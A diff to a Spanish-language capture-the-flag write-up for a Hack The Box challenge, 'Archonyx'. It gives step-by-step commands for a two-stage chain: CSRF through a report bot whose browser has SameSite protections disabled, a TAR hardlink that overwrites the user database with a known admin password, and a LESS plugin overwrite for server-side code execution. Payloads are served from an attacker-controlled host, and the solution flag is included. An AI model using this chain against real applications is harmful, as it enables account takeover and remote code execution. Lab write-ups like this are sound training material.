@@ -11,6 +11,7 @@ La explotación se divide en dos stages:
 Stage 1
 /report
 → bot autenticado
+→ Chromium con protecciones SameSite deshabilitadas
 → CSRF contra /api/fetch
 → extracción TAR antes de validación
 → hardlink absoluto a /app/data/db.json
@@ -97,26 +98,131 @@ POST /ledgermaster/render
 `/api/fetch` exige autenticación:
 
 ```javascript
-router.post('/fetch', resolveAuth, api.uploadUrl);
+router.post(
+  '/fetch',
+  resolveAuth,
+  api.uploadUrl
+);
 ```
 
 El panel administrativo exige el rol `ledgermaster`:
 
 ```javascript
-router.use(requireRole('ledgermaster'));
-router.post('/render', admin.setCertificationTemplate);
+router.use(
+  requireRole('ledgermaster')
+);
+
+router.post(
+  '/render',
+  admin.setCertificationTemplate
+);
 ```
 
-## 5. Diferencia entre subida directa y descarga remota
+## 5. Configuración del bot y política SameSite
+
+El bot genera un JWT válido para el usuario `bot`:
+
+```javascript
+const token = jwt.sign(
+  {
+    username: 'bot',
+    role: 'warden'
+  },
+  jwtSecret
+);
+```
+
+Después inicia Chromium con estas opciones:
+
+```javascript
+browser = await puppeteer.launch({
+  headless: 'new',
+  args: [
+    '--no-sandbox',
+    '--disable-setuid-sandbox',
+    '--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure',
+    '--disable-popup-blocking',
+  ],
+});
+```
+
+La opción crítica es:
+
+```text
+--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure
+```
+
+El bot deshabilita explícitamente las protecciones SameSite modernas de Chromium.
+
+A continuación instala la cookie JWT para el origen interno:
+
+```javascript
+await page.setCookie({
+  name: 'token',
+  value: token,
+  url: `http://${appHost}:${port}/`,
+  path: '/',
+  httpOnly: true,
+});
+```
+
+La cookie no configura un atributo `SameSite`.
+
+Finalmente, el bot navega hacia la URL enviada a `/report`:
+
+```javascript
+await page.goto(
+  url,
+  {
+    waitUntil: 'load',
+    timeout: 10000
+  }
+);
+```
+
+Este comportamiento permite que una página externa envíe un formulario `POST` hacia el origen interno incluyendo la cookie autenticada.
+
+Con la política SameSite moderna activa, un POST cross-site de este tipo normalmente no transportaría una cookie tratada como `Lax`.
+
+La primera primitiva depende, por tanto, de esta combinación:
+
+```text
+JWT válido
++
+cookie instalada para el origen interno
++
+protecciones SameSite deshabilitadas
++
+ausencia de defensa CSRF
+=
+POST cross-site autenticado
+```
+
+## 6. Diferencia entre subida directa y descarga remota
 
 La subida directa validaba el archivo antes de extraerlo.
 
 La descarga remota utilizaba:
 
 ```javascript
-async function downloadAndExtract(url, extractDir) {
-  fs.mkdirSync(extractDir, { recursive: true });
-  await download(url, extractDir, { extract: true });
+async function downloadAndExtract(
+  url,
+  extractDir
+) {
+  fs.mkdirSync(
+    extractDir,
+    {
+      recursive: true
+    }
+  );
+
+  await download(
+    url,
+    extractDir,
+    {
+      extract: true
+    }
+  );
 }
 ```
 
@@ -124,7 +230,7 @@ Después de extraer, la aplicación validaba los archivos de forma asíncrona.
 
 El efecto lateral del extractor ocurría antes de la limpieza.
 
-## 6. Versiones verificadas
+## 7. Versiones verificadas
 
 El reto utilizaba:
 
@@ -148,19 +254,28 @@ if (
 
 ```javascript
 if (x.type === 'link') {
-  return fsP.link(x.linkname, dest);
+  return fsP.link(
+    x.linkname,
+    dest
+  );
 }
 ```
 
 La escritura posterior se realizaba mediante:
 
 ```javascript
-fsP.writeFile(dest, x.data, { mode });
+fsP.writeFile(
+  dest,
+  x.data,
+  {
+    mode
+  }
+);
 ```
 
 `writeFile` truncaba y reescribía el archivo existente. Como `pivot` compartía inode con el archivo objetivo, la escritura modificaba también ese archivo.
 
-## 7. Construcción de Stage 1
+## 8. Construcción de Stage 1
 
 Stage 1 sobrescribe:
 
@@ -221,11 +336,18 @@ Verificación:
 node - <<'NODE'
 const bcrypt = require('bcryptjs');
 
-const password = 'ArchonyxAdmin123!';
+const password =
+  'ArchonyxAdmin123!';
+
 const hash =
   '$2b$10$dsC9VYxPVzqNFYGyoPn9Su0hIMeGcOKKsLkJzOhREKROG8COtvT5a';
 
-console.log(bcrypt.compareSync(password, hash));
+console.log(
+  bcrypt.compareSync(
+    password,
+    hash
+  )
+);
 NODE
 ```
 
@@ -235,12 +357,14 @@ Resultado esperado:
 true
 ```
 
-## 8. Preparar el payload HTML de Stage 1
+## 9. Preparar el payload HTML de Stage 1
 
 Copiar el ejemplo:
 
 ```bash
-cp payloads/stage1.example.html stage1.html
+cp \
+  payloads/stage1.example.html \
+  stage1.html
 ```
 
 Sustituir:
@@ -257,21 +381,28 @@ El formulario envía:
 POST http://127.0.0.1:1337/api/fetch
 ```
 
-Cuando el bot visita la página, su navegador incluye la sesión autenticada.
+El envío sustituye el documento principal y provoca una navegación `POST` hacia el origen interno.
 
-## 9. Servir los payloads
+Como el bot ejecuta Chromium con las protecciones SameSite deshabilitadas y ya ha instalado la cookie JWT para ese origen, la petición incluye la sesión autenticada.
+
+## 10. Servir los payloads
 
 Crear un directorio temporal:
 
 ```bash
 mkdir -p serve
-cp stage1.tar stage1.html serve/
+
+cp \
+  stage1.tar \
+  stage1.html \
+  serve/
 ```
 
 Levantar un servidor HTTP:
 
 ```bash
 cd serve
+
 python3 -m http.server 8000
 ```
 
@@ -280,13 +411,16 @@ Exponerlo mediante el mecanismo autorizado que se esté utilizando.
 Verificar desde otro terminal:
 
 ```bash
-curl -I https://PUBLIC_HOST/stage1.html
-curl -I https://PUBLIC_HOST/stage1.tar
+curl -I \
+  https://PUBLIC_HOST/stage1.html
+
+curl -I \
+  https://PUBLIC_HOST/stage1.tar
 ```
 
 Ambos deben devolver `200`.
 
-## 10. Activar el bot
+## 11. Activar el bot
 
 Definir el objetivo:
 
@@ -297,9 +431,13 @@ export TARGET='http://HOST:PORT'
 Enviar la URL controlada:
 
 ```bash
-curl -sS -X POST "$TARGET/report" \
-  --data-urlencode 'body=Review this manifest.' \
-  --data-urlencode 'url=https://PUBLIC_HOST/stage1.html'
+curl -sS \
+  -X POST \
+  "$TARGET/report" \
+  --data-urlencode \
+    'body=Review this manifest.' \
+  --data-urlencode \
+    'url=https://PUBLIC_HOST/stage1.html'
 ```
 
 En el servidor HTTP deberían aparecer:
@@ -312,10 +450,10 @@ GET /stage1.tar
 Eso confirma:
 
 1. que el bot visitó la página;
-2. que el formulario ejecutó `/api/fetch`;
+2. que el formulario ejecutó `/api/fetch` con su sesión;
 3. que Archonyx descargó y extrajo el TAR.
 
-## 11. Login como ledgermaster
+## 12. Login como ledgermaster
 
 Guardar la cookie:
 
@@ -328,9 +466,12 @@ Autenticarse:
 ```bash
 curl -i -sS \
   -c archonyx.cookies \
-  -X POST "$TARGET/enter" \
-  --data-urlencode 'username=admin' \
-  --data-urlencode 'password=ArchonyxAdmin123!'
+  -X POST \
+  "$TARGET/enter" \
+  --data-urlencode \
+    'username=admin' \
+  --data-urlencode \
+    'password=ArchonyxAdmin123!'
 ```
 
 La respuesta esperada incluye:
@@ -347,10 +488,11 @@ Confirmar el acceso:
 curl -sS \
   -b archonyx.cookies \
   "$TARGET/ledgermaster/" |
-grep -o 'Ledgermaster[^<]*'
+grep -o \
+  'Ledgermaster[^<]*'
 ```
 
-## 12. Validación inocua de LESS
+## 13. Validación inocua de LESS
 
 Antes de ejecutar `/readflag`, validar la carga de plugins localmente.
 
@@ -365,8 +507,10 @@ docker cp \
 Eliminar un marcador previo:
 
 ```bash
-docker exec archonyx-local \
-  rm -f /tmp/archonyx-less-marker
+docker exec \
+  archonyx-local \
+  rm -f \
+  /tmp/archonyx-less-marker
 ```
 
 Enviar el payload LESS:
@@ -391,10 +535,12 @@ La respuesta esperada es:
 Comprobar el marcador:
 
 ```bash
-docker exec archonyx-local sh -c '
-  ls -l /tmp/archonyx-less-marker
-  cat /tmp/archonyx-less-marker
-'
+docker exec \
+  archonyx-local \
+  sh -c '
+    ls -l /tmp/archonyx-less-marker
+    cat /tmp/archonyx-less-marker
+  '
 ```
 
 Resultado esperado:
@@ -405,7 +551,7 @@ LESS_PLUGIN_EXECUTED
 
 Esto demuestra ejecución de JavaScript en el servidor como usuario `ctf`.
 
-## 13. Construcción de Stage 2
+## 14. Construcción de Stage 2
 
 Stage 2 sobrescribe:
 
@@ -445,12 +591,14 @@ y guarda la salida en:
 /app/public/archonyx-proof.txt
 ```
 
-## 14. Preparar el payload HTML de Stage 2
+## 15. Preparar el payload HTML de Stage 2
 
 Copiar el ejemplo:
 
 ```bash
-cp payloads/stage2.example.html stage2.html
+cp \
+  payloads/stage2.example.html \
+  stage2.html
 ```
 
 Sustituir:
@@ -464,24 +612,34 @@ por la URL pública real.
 Copiar ambos archivos al servidor:
 
 ```bash
-cp stage2.tar stage2.html serve/
+cp \
+  stage2.tar \
+  stage2.html \
+  serve/
 ```
 
 Verificar:
 
 ```bash
-curl -I https://PUBLIC_HOST/stage2.html
-curl -I https://PUBLIC_HOST/stage2.tar
+curl -I \
+  https://PUBLIC_HOST/stage2.html
+
+curl -I \
+  https://PUBLIC_HOST/stage2.tar
 ```
 
-## 15. Entregar Stage 2
+## 16. Entregar Stage 2
 
 Enviar la segunda URL al bot:
 
 ```bash
-curl -sS -X POST "$TARGET/report" \
-  --data-urlencode 'body=Review the second manifest.' \
-  --data-urlencode 'url=https://PUBLIC_HOST/stage2.html'
+curl -sS \
+  -X POST \
+  "$TARGET/report" \
+  --data-urlencode \
+    'body=Review the second manifest.' \
+  --data-urlencode \
+    'url=https://PUBLIC_HOST/stage2.html'
 ```
 
 En los logs del servidor deberían aparecer:
@@ -491,7 +649,7 @@ GET /stage2.html
 GET /stage2.tar
 ```
 
-## 16. Activar el plugin sobrescrito
+## 17. Activar el plugin sobrescrito
 
 Enviar el CSS al panel administrativo:
 
@@ -512,7 +670,7 @@ Respuesta esperada:
 {"data":"Seal cast"}
 ```
 
-## 17. Recuperar la flag
+## 18. Recuperar la flag
 
 Leer el archivo publicado:
 
@@ -527,7 +685,7 @@ Resultado:
 HTB{wh4t_th3_l3dg3r_cl34rs_th3_c04st_b3l13v3s_7905347203642d5c8c3429368cc230f6}
 ```
 
-## 18. Por qué funciona `/readflag`
+## 19. Por qué funciona `/readflag`
 
 El contenedor mueve la flag a:
 
@@ -562,14 +720,15 @@ RCE como ctf
 → lectura de /flag.txt
 ```
 
-## 19. Troubleshooting
+## 20. Troubleshooting
 
 ### El bot no solicita la página
 
 Comprobar:
 
 ```bash
-curl -I https://PUBLIC_HOST/stage1.html
+curl -I \
+  https://PUBLIC_HOST/stage1.html
 ```
 
 Revisar que la URL enviada a `/report` utilice `http://` o `https://`.
@@ -589,6 +748,20 @@ o:
 ```text
 https://PUBLIC_HOST/stage2.tar
 ```
+
+### El POST llega sin autenticación
+
+Confirmar que la reproducción utiliza el bot original del reto.
+
+El bot debe iniciar Chromium con:
+
+```text
+--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure
+```
+
+Y debe instalar previamente la cookie JWT mediante `page.setCookie`.
+
+Sin esa configuración, un POST cross-site moderno puede no incluir la cookie.
 
 ### El login no funciona
 
@@ -624,13 +797,16 @@ Después revisar que Stage 2 haya sobrescrito:
 Verificar:
 
 ```bash
-curl -I https://PUBLIC_HOST/stage1.html
-curl -I https://PUBLIC_HOST/stage1.tar
+curl -I \
+  https://PUBLIC_HOST/stage1.html
+
+curl -I \
+  https://PUBLIC_HOST/stage1.tar
 ```
 
 Un túnel expirado puede producir falsos negativos aunque el exploit sea correcto.
 
-## 20. Limpieza
+## 21. Limpieza
 
 Eliminar artefactos locales:
 
@@ -649,7 +825,7 @@ Detener el contenedor:
 docker stop archonyx-local
 ```
 
-## 21. Referencias internas
+## 22. Referencias internas
 
 - [Análisis técnico](../article/archonyx-analysis.md)
 - [Generador de Stage 1](../scripts/build_stage1_tar.py)
